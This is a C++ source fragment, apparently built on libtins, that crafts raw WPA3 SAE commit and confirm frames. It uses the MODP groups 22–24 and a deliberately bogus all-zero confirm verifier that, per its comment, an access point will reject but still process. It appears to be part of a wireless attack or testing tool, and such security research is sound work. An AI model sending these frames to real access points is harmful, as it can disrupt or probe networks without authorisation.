RadioTap make_sae_confirm(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
	Dot11Authentication auth(ap_mac, sta_mac);
	auth.addr3(ap_mac);
	auth.auth_algorithm(dot11::AUTH_ALG_SAE);
	auth.auth_seq_number(sae_defs::SAE_CONFIRM_SEQ);
	auth.status_code(dot11::STATUS_SUCCESS);
	// SC (2 bytes) + verifier (32 bytes zeros - garbage, AP will reject but still process)
	const size_t conf_size = sizeof(sae_defs::SaeSeq) + sae_defs::group_params.at(sae_defs::P256).scalar_len;
	auth.inner_pdu(RawPDU(frame_raw_t(conf_size, 0)));
	RadioTap rt{};
	rt.tx_flags(radiotap::TX_NOACK | radiotap::TX_ORDER);
	rt.inner_pdu(auth);
	return rt;
}
RadioTap make_modp_commit(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, sae_defs::SaeGroup group_id) {
	SAEPair p;
	p.group_id = group_id;
	p.status = dot11::STATUS_SUCCESS;
	switch(group_id) {
	case sae_defs::MODP_1024:
		p.scalar.assign(MODP_G22_SCALAR, MODP_G22_SCALAR + 128);
		p.element.assign(MODP_G22_ELEMENT, MODP_G22_ELEMENT + 128);
		break;
	case sae_defs::MODP_2048:
		p.scalar.assign(MODP_G23_SCALAR, MODP_G23_SCALAR + 256);
		p.element.assign(MODP_G23_ELEMENT, MODP_G23_ELEMENT + 256);
		break;
	case sae_defs::MODP_2048_256:
		p.scalar.assign(MODP_G24_SCALAR, MODP_G24_SCALAR + 256);
		p.element.assign(MODP_G24_ELEMENT, MODP_G24_ELEMENT + 256);
		break;
	default: throw run_err("make_modp_commit: unsupported group {}", static_cast<uint16_t>(group_id));
	}
	return make_sae_commit(ap_mac, sta_mac, p);
}
